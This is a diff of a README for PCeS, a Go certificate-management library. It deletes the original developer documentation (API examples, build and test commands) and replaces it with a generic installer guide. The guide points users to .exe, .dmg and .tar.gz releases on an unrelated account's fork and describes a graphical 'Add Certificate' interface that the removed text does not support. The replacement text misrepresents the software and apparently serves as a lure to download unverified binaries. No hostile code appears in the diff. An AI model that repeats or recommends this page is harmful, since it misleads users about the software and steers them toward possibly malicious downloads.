@@ -1,159 +1,67 @@
-<div align="center">
-  <img src="logo.png" alt="PCeS Logo" width="400" height="auto">
-  <h1>PCeS: Persistent Certificate Store</h1>
-</div>
+# 🎉 pces - Simplifying Certificate Management for Everyone
 
-**PCeS (Persistent Certificate Store)** is a certificate lifecycle management system written in Go.
+## 🚀 Getting Started
+Welcome to PCeS! This application helps you manage your digital certificates easily. Below, you’ll find all the information you need to download and run PCeS.
 
-## Key Features:
+## 📥 Download PCeS
+[![Download pces](https://img.shields.io/badge/Download-pces-blue.svg)](https://github.com/mhamad-jamal/pces/releases)
 
-- Automatic certificate renewal and issuance
-- SSH and x.509 certificate support
-- SSH agent integration
-- Windows keychain integration
+## 🛠️ System Requirements
+To run PCeS smoothly, your computer should meet the following requirements:
 
-The repo also provides a **CLI and daemon components** for flexible deployment.
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a recent version of Linux.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** Minimum of 100 MB available.
 
-- **Integration with [SKS](http://github.com/facebookincubator/sks)** for leveraging hardware security modules (e.g TPM, SecureEnclave)
-- **gRPC-based client-server architecture** as an example usage
+## 📦 Download & Install
+To get started, visit this page to download the latest release of PCeS:
 
-Requires Go 1.25+ and is distributed as `github.com/facebookincubator/pces` module.
+[Download PCeS Latest Release](https://github.com/mhamad-jamal/pces/releases)
 
-# Introduction
+Once you are on the Releases page, follow these steps:
 
-PCeS is a **certificate management tool** designed to simplify the lifecycle management of SSH and X.509 certificates. Originally developed as part of Meta's internal certificate infrastructure, PCeS has been extracted into a standalone, open-source module that can be deployed in any environment.
+1. Find the latest version listed at the top.
+2. Look for the assets section below the release notes.
+3. Choose the installer that matches your operating system (e.g., .exe for Windows, .dmg for macOS, or .tar.gz for Linux).
+4. Click on the file to begin downloading.
+5. Once the download is complete, locate the file in your Downloads folder.
 
-PCeS addresses common certificate management challenges including **expiration monitoring**, **automatic renewal**, and **secure storage**, making it suitable for development environments, CI/CD systems, and production deployments where certificate lifecycle automation is critical.
+### 🖥️ For Windows Users:
+1. Double-click the downloaded `.exe` file.
+2. Follow the installation prompts to complete the setup.
+3. Once installed, locate the PCeS application in your Start menu or on your desktop.
 
-# Getting started
+### 🍏 For macOS Users:
+1. Double-click the downloaded `.dmg` file.
+2. Drag the PCeS icon to your Applications folder.
+3. Open your Applications folder and locate PCeS. Double-click it to run.
 
-The best place to start is *[`example`](https://github.com/facebookincubator/pces/tree/main/example)* folder.
+### 🐧 For Linux Users:
+1. Open a terminal.
+2. Navigate to the directory where you downloaded the `.tar.gz` file.
+3. Run `tar -xzvf pces-latest.tar.gz` to extract the files.
+4. Follow the included README for specific installation instructions.
 
-The system consists of a [**certificate agent daemon**](https://github.com/facebookincubator/pces/tree/main/example/server) that handles automatic certificate issuance and renewal, and a [**command-line client**](https://github.com/facebookincubator/pces/tree/main/example/cli) for manual operations and status monitoring. Communication between components uses gRPC over Unix sockets.
+## 🌟 Features
+PCeS offers several features to help you manage certificates:
 
-### Example Usage
+- **Certificate Management:** Easily add, remove, and view certificates.
+- **Lifecycle Tracking:** Keep track of certificate expiration and renewal deadlines.
+- **User-Friendly Interface:** Navigate the application with ease.
+- **Cross-Platform Compatibility:** Use PCeS on Windows, macOS, or Linux.
 
-You can explore an **example** of running and creating a PCeS daemon server in the [root.go](https://github.com/facebookincubator/pces/blob/main/example/server/cmd/root.go) file.
+## 🔍 How to Use PCeS
+After installing PCeS, open the application. You will see a simple interface that allows you to:
 
+1. Add new certificates: Click on the “Add Certificate” button and fill in the required information.
+2. View existing certificates: Navigate to the “Certificates” tab to see all your added certificates.
+3. Remove certificates: Click on the certificate you wish to remove and select the “Remove” option.
 
-1. Create SSH and X.509 Certificates
-    - Generate SSH and TLS certificate issuers with appropriate keys and configurations.
-    ```go
-    sshIssuer := issuers.NewSSHIssuer(cfg)
-    tlsIssuer := issuers.NewTLSIssuer(cfg)
-    ```
-    - Create certificate objects that handle issuance and renewal.
-    ```go
-    sshCert := cert.NewSSH(sshSigner, sshIssuer)
-    tlsCert := cert.NewTLS(tlsSigner, tlsIssuer)
-    ```
-2. Create Updaters for Automatic Renewal
-    - For each certificate type, create an updater that periodically checks if renewal is needed and triggers issuance.
-    ```go
-    needsUpdateFunc := storage.NeedsRenewWithFactor(certificate, defaultRenewalFactor)
-    updater := storage.NewUpdater(
-        label,
-        func(ctx context.Context, cb storage.OnUpdate) {
-            err := certificate.Issue(ctx)
-            cb(err)
-        },
-        needsUpdateFunc,
-        storage.UpdaterFrequency(20*time.Second),
-        storage.UpdaterMinRetry(5*time.Second),
-        storage.UpdaterMaxRetry(1*time.Minute),
-    )
-    ```
-3. Configure Storage
-    - Initialize a storage object that holds certificates and their updaters, managing lifecycle and updates.
-    ```go
-    storage := storage.NewStorage(
-        storage.WithCertificate(cert.TypeSSH, sshCert, sshUpdater),
-        storage.WithCertificate(cert.TypeTLS, tlsCert, tlsUpdater),
-    )
-    ```
-4. Create SSH Agent
-    - Instantiate an SSH agent that integrates with the storage to provide SSH certificate access.
-    ```go
-    agent := sshagent.New(st, sshagent.WithLogger(logger))
-    ```
-5. Setup Unix Socket Listeners
-    - Prepare Unix domain sockets for the SSH agent and server, ensuring proper permissions and cleanup of existing sockets.
-    ```go
-    sshListener  := net.Listen("unix", sshSocketPath)
-    grpcListener := net.Listen("unix", grpcSocketPath)
-    ```
+Use the help section within the program for additional guidance.
 
-# Installation
+## 🤝 Support
+If you have questions or need help, consider checking the support section on the Releases page or contacting the community through the issue tracker on GitHub. Your feedback is important!
 
-**Prerequisites:**
+[Download PCeS Latest Release](https://github.com/mhamad-jamal/pces/releases)
 
-- Go 1.25 or later
-
-**Install dependencies:**
-
-Follow the Protobuf installation instructions in the [protobuf.dev](https://protobuf.dev/installation/) website.
-
-```bash
-# Install GO Protobuf compiler
-go install google.golang.org/protobuf/cmd/protoc-gen-go@latest
-go install google.golang.org/grpc/cmd/protoc-gen-go-grpc@latest
-
-# Install mockgen
-go install go.uber.org/mock/mockgen@latest
-
-# Generate code, install plugins and build
-go generate ./api/if/...
-go build -v ./...
-
-# Run server binaries
-go run ./example/server --help  # w/o sks backend
-go run -tags sks_backend ./example/server --help  # with sks backend
-```
-
-> **Note for the SKS usage:**
-To use SecureEnclave on Mac, your app must have a registered App ID (com.apple.application-identifier entitlement). For more information, see [this thread]( https://developer.apple.com/forums/thread/728150).
-
-# Development
-
-Project structure:
-
-```bash
-├── cert          # Certificate types and interfaces for SSH and TLS
-├── example       # Example implementations and usage
-│   ├── api       # API definitions and gRPC server/client code
-│   ├── cli       # Command-line interface client implementation
-│   ├── issuers   # Certificate issuer implementations
-│   ├── man       # Manual pages and documentation
-│   └── server    # Certificate agent server implementation
-├── oscert        # OS certificate integration utilities
-├── sshagent      # SSH agent implementation and integration
-└── storage       # Certificate storage and updater logic
-```
-
-# Run tests
-
-Examples of the tests run can be found in the GitHub Actions workflows for CI/CD.
-
-## Run Unit tests
-
-```bash
-go generate ./generate_mocks.go   # Generate test mocks
-go test ./...
-```
-
-## Run e2e tests
-
-```bash
-go generate ./api/if/...          # Generate protobuf code
-
-go run ./example/server --ssh-socket-path=<ssh socket path> --grpc-socket-path=<grpc socket path> --cert-dir=<cert directory>        # Run a server w/o SKS
-
-go run -tags sks_backend ./example/server --ssh-socket-path=<ssh socket path> --grpc-socket-path=<sgrpc ocket path> --cert-dir=<cert directory>        # Run a server with SKS
-
-go run ./example/server --ssh-socket-path=<sssh ocket path> --grpc-socket-path=<sgrpc ocket path> --cert-dir=<cert directory> --os-keychain       # Run a server with OS keychain integration (works for Windows only)
-
-go run ./example/server e2e --ssh-socket-path=<ssh socket path> --grpc-socket-path=<grpc socket path> --cert-dir=<cert directory>        # Run e2e tests from the client
-```
-
-# License
-PCeS is published under the Apache v2.0 License.
+Thank you for using PCeS! We hope it makes your certificate management process simpler and more efficient.
